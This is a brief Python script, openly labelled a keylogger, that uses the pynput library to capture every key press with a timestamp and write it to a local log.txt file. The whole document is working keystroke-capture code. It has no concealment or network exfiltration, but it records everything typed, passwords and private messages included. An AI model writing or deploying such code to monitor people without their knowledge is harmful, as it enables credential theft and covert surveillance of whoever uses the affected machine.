from pynput import keyboard
from datetime import datetime

# simple keylogger that logs all key presses to log.txt
f = open("log.txt", "w")

def on_press(key):
    f.write(str(datetime.now()) + " " + str(key) + "\n")
    f.flush()


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
